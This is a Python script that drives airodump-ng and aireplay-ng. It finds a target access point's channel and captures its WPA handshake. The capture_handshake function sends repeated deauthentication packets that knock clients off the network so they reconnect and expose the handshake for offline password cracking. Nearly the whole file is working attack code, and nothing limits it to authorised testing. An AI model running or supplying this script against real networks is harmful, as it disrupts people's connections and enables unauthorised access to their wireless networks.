import subprocess
import time
import os
import signal
import csv


def _ensure_str(x):
    
    if isinstance(x, tuple):
        return x[0]
    return x


def find_channel_by_bssid(interface, bssid, timeout=8):
    interface = _ensure_str(interface)
    bssid = _ensure_str(bssid)

    prefix = "/tmp/channel_scan"

    proc = subprocess.Popen(
        [
            "airodump-ng",
            "--band", "bg",
            "--output-format", "csv",
            "--write", prefix,
            interface
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid
    )

    time.sleep(timeout)
    os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    proc.wait()

    csv_file = f"{prefix}-01.csv"
    if not os.path.exists(csv_file):
        return None

    channels = []

    with open(csv_file, encoding="utf-8", errors="ignore") as f:
        reader = csv.reader(f)
        for row in reader:
            if len(row) > 13 and row[0].strip().lower() == bssid.lower():
                try:
                    channels.append(int(row[3]))
                except ValueError:
                    pass

    if not channels:
        return None

    return max(set(channels), key=channels.count)


def capture_handshake(interface, bssid, ssid, channel, prefix, duration=120, deauth=True):
    interface = _ensure_str(interface)
    bssid = _ensure_str(bssid)

    airodump_cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "--essid", ssid,
        "-c", str(channel),
        "-w", prefix,
        interface
    ]

    aireplay_cmd = [
        "aireplay-ng",
        "-0", "30",           
        "-a", bssid,
        interface
    ]

    print(f"Starting capture for {duration} seconds")
    print(f"Command: {' '.join(airodump_cmd)}")
    if deauth:
        print(f"Deauth command: {' '.join(aireplay_cmd)}")
    procs = []
    try:
        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setsid
        )
        procs.append(airodump_proc)
        if deauth:
            deauth_proc = subprocess.Popen(
                aireplay_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid
            )
            procs.append(deauth_proc)
            print(f"Deauth packets are being sent")
        time.sleep(duration)
        print("Time elapsed, stopping capture")

        for proc in procs:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=3)
            except ProcessLookupError:
                pass  
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)        

        print(f"Capture stopped cleanly")
        print(f"Output file: {prefix}-01.cap")

        return True

    except KeyboardInterrupt:
        print(f"Interrupted by user")
        for proc in procs:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except:
                pass
        return False

    except Exception as e:
        print(f"[!] Error: {e}")
        for proc in procs:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except:
                pass
        return False
